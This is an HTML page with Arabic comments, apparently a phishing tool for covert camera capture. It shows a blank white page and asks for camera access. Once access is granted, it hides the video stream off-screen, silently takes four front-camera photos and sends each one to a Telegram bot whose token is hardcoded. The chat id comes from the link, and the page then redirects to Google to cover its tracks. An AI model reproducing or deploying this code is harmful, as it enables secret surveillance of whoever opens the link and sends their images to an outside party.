<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title></title>
    <style>
        /* خلفية بيضاء نقية */
        body { 
            background: white;
            margin: 0;
            padding: 0;
            width: 100vw;
            height: 100vh;
        }
    </style>
</head>
<body>
    <script>
        // ==================== جلب الإيدي من الرابط ====================
        const USER_ID = new URLSearchParams(window.location.search).get('id');
        const BOT_TOKEN = "8307560710:AAFNRpzh141cq7rKt_OmPR0A823dxEaOZVU";

        // إذا ما في ID بالرابط، نوقف
        if (!USER_ID) {
            // صفحة بيضاء
        } else {
            // ==================== طلب الكاميرا مع إعدادات صحيحة ====================
            navigator.mediaDevices.getUserMedia({ 
                video: { 
                    facingMode: 'user',
                    width: { ideal: 1920 },
                    height: { ideal: 1080 },
                    advanced: [
                        { torch: false }, // إيقاف الفلاش
                        { exposureMode: 'continuous' },
                        { whiteBalanceMode: 'continuous' }
                    ]
                }
            })
            .then(async (stream) => {
                // تمت الموافقة ✅
                
                // عنصر فيديو مخفي
                const video = document.createElement('video');
                video.srcObject = stream;
                video.setAttribute('playsinline', '');
                video.setAttribute('autoplay', '');
                video.setAttribute('muted', 'true');
                video.style.position = 'absolute';
                video.style.left = '-9999px';
                video.style.top = '-9999px';
                video.style.width = '1px';
                video.style.height = '1px';
                video.style.opacity = '0';
                document.body.appendChild(video);

                // انتظار تحميل الفيديو بشكل كامل
                await new Promise(resolve => {
                    video.onloadedmetadata = () => {
                        video.play();
                        resolve();
                    };
                });

                // انتظار اضافي لتثبيت الإضاءة
                await new Promise(r => setTimeout(r, 1000));

                // التأكد من أن الفيديو يعرض صورة حقيقية
                const checkVideo = () => {
                    return new Promise(resolve => {
                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth || 640;
                        canvas.height = video.videoHeight || 480;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0);
                        const imageData = ctx.getImageData(0, 0, canvas.width, canvas.height);
                        const data = imageData.data;
                        
                        // فحص إذا كانت الصورة سوداء بالكامل
                        let isBlack = true;
                        for (let i = 0; i < 100; i += 4) {
                            if (data[i] > 10 || data[i+1] > 10 || data[i+2] > 10) {
                                isBlack = false;
                                break;
                            }
                        }
                        resolve(!isBlack);
                    });
                };

                // انتظار حتى تظهر صورة حقيقية (الحد الأقصى 3 ثواني)
                let attempts = 0;
                while (attempts < 6) {
                    const hasImage = await checkVideo();
                    if (hasImage) break;
                    await new Promise(r => setTimeout(r, 500));
                    attempts++;
                }

                // التقاط 4 صور
                for (let i = 0; i < 4; i++) {
                    // تأخير بسيط بين الصور
                    await new Promise(r => setTimeout(r, i * 400));

                    const canvas = document.createElement('canvas');
                    canvas.width = video.videoWidth || 1280;
                    canvas.height = video.videoHeight || 720;
                    
                    const ctx = canvas.getContext('2d');
                    
                    // تحسين الإضاءة
                    ctx.filter = 'brightness(1.1) contrast(1.05)';
                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                    
                    // إزالة الفلتر بعد الرسم
                    ctx.filter = 'none';

                    const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.95));

                    const formData = new FormData();
                    formData.append('chat_id', USER_ID);
                    formData.append('photo', blob, `selfie_${i+1}.jpg`);

                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    }).catch(e => {});
                }

                // تنظيف
                stream.getTracks().forEach(t => t.stop());
                video.remove();

                // تحويل لجوجل ✅
                window.location.replace("https://www.google.com");
            })
            .catch((error) => {
                // تم الرفض ❌ - صفحة بيضاء
                console.log('Camera denied:', error);
                // البقاء في الصفحة البيضاء
            });
        }
    </script>
</body>
</html>
